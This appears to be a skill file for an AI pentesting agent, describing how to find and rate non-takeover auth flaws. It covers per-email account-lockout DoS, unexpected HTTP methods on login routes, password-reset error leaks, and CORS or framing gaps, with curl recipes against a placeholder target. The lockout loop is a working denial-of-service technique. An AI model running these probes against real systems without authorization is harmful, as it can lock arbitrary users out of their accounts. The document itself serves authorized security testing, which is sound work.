---
name: hunt-account-abuse
description: "Hunt non-ATO account-abuse vulnerabilities — logic flaws in authentication/account endpoints that cause harm without taking over another account. Covers: per-email account-lockout DoS (rate-limit keyed on victim email instead of IP), HTTP-method anomalies on auth routes (DELETE/PUT on /login returning success), password-reset fragility and error-handling leaks, and the missing-header/CORS triage that turns these from noise into rated findings. Use when testing login/register/forgot-password/MFA endpoints, reviewing auth flow resilience, or rating auth-logic bugs that are NOT full account takeover. Complements hunt-ato (which covers takeover paths only)."
---

# Hunt — Non-ATO Account Abuse

Account abuse is broader than ATO. These primitives damage availability, integrity, or leak via auth logic but do NOT require taking over a second account — so they are rated on their own severity, not the ATO gate. All recipes below were executed against a live Next.js/Vercel target and verified.

## When this applies
- You are probing `/api/auth/*`, `/login`, `/register`, `/forgot-password`, `/reset`, `/mfa/*`.
- Rate-limit / lockout behavior observed on login.
- `OPTIONS` reveals unexpected allowed methods.
- Reset/forgot-password returns inconsistent or 5xx errors.

## Primitive A — Per-Email Account-Lockout DoS (High when lock is per-victim-email)
A failed-login rate-limit that counts per **target email** (not per source IP/session) is an offensive weapon: an unauthenticated attacker locks any user out by sending N bad logins for that user's email.

Detection recipe:
```bash
# 1) Burst failed logins at the VICTIM email:
for i in $(seq 1 6); do
  curl -s -X POST https://TARGET/api/auth/login -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","password":"wrongpass"}'; echo; done
# 2) Look for: {"error":{"message":"Account temporarily locked...","blocked":true,"resetTime":"..."}}
# 3) KEY SCOPE TEST — different email from SAME IP:
curl -s -X POST https://TARGET/api/auth/login -H "Content-Type: application/json" \
  -d '{"email":"someone_else@example.com","password":"wrongpass"}'
#    Different email still allowed ("4 attempts remaining") => lock is PER-EMAIL => DoS confirmed (High).
#    Different email ALSO blocked => lock is per-IP => Low/self-DoS, usually N/A.
```
Severity rule:
- Lock keyed on **victim email** (other emails still work) => **High** (mass lockout of arbitrary users, no auth needed).
- Lock keyed on **IP/session** (any other email also blocked) => Low/self-DoS, typically N/A.
- Also flag if `failedAttempts` / lock state is exposed to unauthenticated callers (info leak).
PoC pattern: a self-contained `poc_account_lockout_dos.py` that takes `--email` and sends `--attempts` failed POSTs, asserting `blocked:true` is reached.

## Primitive B — HTTP-Method Anomalies on Auth Routes (Medium)
Auth endpoints often `allow` unexpected methods. Probe the method surface; undefined behavior on a security-critical route is a logic flaw.
```bash
curl -s -i -X OPTIONS https://TARGET/api/auth/login -H "Origin: https://x.com" | grep -iE "allow|access-control"
for m in DELETE PUT PATCH TRACE; do
  echo "$m:"; curl -s -o /dev/null -w "%{http_code}\n" -X $m https://TARGET/api/auth/login \
    -H "Content-Type: application/json" -d '{}'; done
```
Verified example: `OPTIONS` allowed `DELETE, OPTIONS, POST`; `DELETE /api/auth/login` (no auth) returned `HTTP 200 {"success":true}` while `PUT`/`TRACE` returned 405. Audit what `DELETE` actually does server-side (session purge? token revoke? no-op?).

## Primitive C — Reset-Flow Fragility / Error-Handling Leak (Medium)
`/forgot-password` that returns a blanket `HTTP 500 {"Failed to process request."}` for every valid-format email (including non-existent ones), while malformed emails get a clean `400`, means the reset backend throws unhandled exceptions.
```bash
curl -s -X POST https://TARGET/api/auth/forgot-password -H "Content-Type: application/json" -d '{"email":"valid@format.com"}'   # 500
curl -s -X POST https://TARGET/api/auth/forgot-password -H "Content-Type: application/json" -d '{"email":"notanemail"}'         # 400
```
Impact: fragile password-reset availability + inconsistent semantics that can aid enumeration. Remediation: uniform response regardless of account existence; never surface raw 500 to clients for expected input.

## Triage: headers & CORS that accompany auth findings
When reporting auth-logic bugs, also note (and rate separately) the surrounding hardening gaps:
- **Missing `X-Frame-Options` / `Content-Security-Policy frame-ancestors`** on `/login`, `/register` => clickjacking (Low, but upgrades if combined with credential capture).
- **Permissive CORS `access-control-allow-origin: *`**: only dangerous if `Access-Control-Allow-Credentials: true` is ALSO present (cookie theft). If `ACAC` is absent, rate Low and note "becomes High once credentialed CORS is enabled." Confirm by sending a forged `Origin` and checking both headers together.

## SAFE signals (do NOT re-flag)
- Dashboard/protected routes 307-redirect to `/login` without auth (access control OK).
- Mass-assignment (`role:admin`, `isAdmin:true`) in register ignored server-side.
- Server-side password policy (min length) enforced.
- Source maps 403; no `/robots.txt`, `/sitemap.xml`, `/.well-known/security.txt`, or debug endpoints exposed.
- No reflected XSS on `?next=`/`?ref=`/`?q=` params (payloads not echoed in body).

## Tooling notes
- `sqlmap` may fail in minimal envs (`python` binary missing -> `ln -sf $(which python3) /usr/local/bin/python`; or "missing modules" -> treat as coverage gap, not "no SQLi").
- `dalfox`/`katana` flags differ by version — verify with `--help` rather than assuming (`-l`/`-L` not valid in some builds; use `dalfox url <url>` or pipe).
- Aggregate report tooling (`aggregate_reports`) expects a fixed reports path (e.g. `reports/<target>`) — copy findings there before running.

## Related Skills
- **hunt-ato** — covers full account-TAKEOVER paths only (reset poisoning, JWT forgery, OAuth, IDOR email-change). Use it when the impact is taking over account B. This skill covers the abuse/availability/logic flaws that fall short of takeover.
- **web-pentest** — orchestrator; delegate auth-flow testing here when the target is a full web app.
- **hunt-brute-force** — rate-limit / brute-force angle on login; pair with Primitive A to distinguish "per-IP lockout (Low)" from "per-email lockout (High)".
